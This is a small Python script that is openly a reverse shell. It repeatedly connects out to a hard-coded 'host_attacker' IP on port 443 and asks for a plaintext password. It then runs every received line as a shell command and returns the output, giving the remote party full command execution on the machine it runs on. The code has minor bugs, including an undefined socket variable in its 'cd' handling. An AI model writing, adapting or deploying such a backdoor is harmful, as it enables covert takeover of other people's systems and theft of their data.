import subprocess
import socket
import time
import os

host_attacker = "192.168.2.49"
port = 443
password = "1234"


def getDirPath():
	return os.getcwd() + ": "

def connectedSocket():
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
			s.connect((host_attacker,port))
			return s
		except:
			print("Connecting...")
			time.sleep(6)
			continue

def Login(sck):
	login = "Login: "
	sck.send(login.encode())
	pwd = sck.recv(1024)
	if pwd.decode().strip() != password:
		Login(sck)

	sck.send(getDirPath().encode())
	Shell(sck)

def Shell(sck):
	while True:
		data = sck.recv(1024)
		if data.decode().strip() == "exit":
			sck.close()
			main()

		try:
			cmd, params = data.decode().split(" ", 1)
			if cmd.strip() == "cd":
				os.chdir(params.strip())
				s.send(getDirPath().encode())
				continue
		except:
			pass

		proc = subprocess.Popen(data.decode().strip(), shell = True, stdout = subprocess.PIPE, stderr = subprocess.PIPE, stdin = subprocess.PIPE)
		output = proc.stdout.read() + proc.stderr.read()
		sck.send(output)
		sck.send(getDirPath().encode())

def main():
	sck = connectedSocket()
	while True:
		Login(sck)
		time.sleep(6)

main()
